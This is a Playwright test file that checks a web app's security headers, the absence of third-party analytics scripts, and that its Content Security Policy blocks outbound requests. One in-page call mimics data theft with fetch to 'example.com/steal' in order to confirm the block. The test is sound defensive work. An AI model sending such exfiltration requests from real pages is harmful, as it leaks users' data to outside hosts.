import { test, expect, openEditor, tiles } from "./fixtures";

test("pages are served with the CSP and hardening headers, and without x-powered-by", async ({ request }) => {
  for (const path of ["/", "/app", "/no-such-page"]) {
    const res = await request.get(path);
    const h = res.headers();
    expect(h["content-security-policy"], path).toContain("connect-src 'self' https://api.anthropic.com");
    expect(h["content-security-policy"], path).toContain("object-src 'none'");
    expect(h["x-content-type-options"]).toBe("nosniff");
    expect(h["x-frame-options"]).toBe("DENY");
    expect(h["referrer-policy"]).toBe("strict-origin-when-cross-origin");
    expect(h["x-powered-by"], path).toBeUndefined();
  }
});

test("with no analytics configured, pages load no third-party script and carry no Rybbit API key", async ({
  request,
}) => {
  for (const path of ["/", "/app"]) {
    const html = await (await request.get(path)).text();
    expect(html, path).not.toContain("data-api-key");
    expect(html, path).not.toContain("googletagmanager");
    expect(html, path).not.toContain("rybbit");
    expect(html.match(/<script[^>]+src="https?:/g), path).toBeNull();
  }
});

test.describe("the CSP in the browser", () => {
  test.use({ allowErrors: /Content[- ]Security[- ]Policy|Refused to connect|Failed to fetch/ });

  test("lets the app run but blocks connections to other hosts", async ({ page }) => {
    const violations: string[] = [];
    page.on("console", (m) => /Content[- ]Security[- ]Policy/.test(m.text()) && violations.push(m.text()));
    await page.goto("/");
    await expect(page.getByRole("heading", { level: 1 })).toBeVisible();
    await openEditor(page);
    await tiles(page).first().click();
    await expect(page.locator(".react-flow__node")).toHaveCount(1);
    expect(violations).toEqual([]);

    const blocked = await page.evaluate(() =>
      fetch("https://example.com/steal?k=1").then(
        () => "sent",
        () => "blocked"
      )
    );
    expect(blocked).toBe("blocked");
    expect(violations.some((v) => v.includes("example.com"))).toBe(true);
  });
});
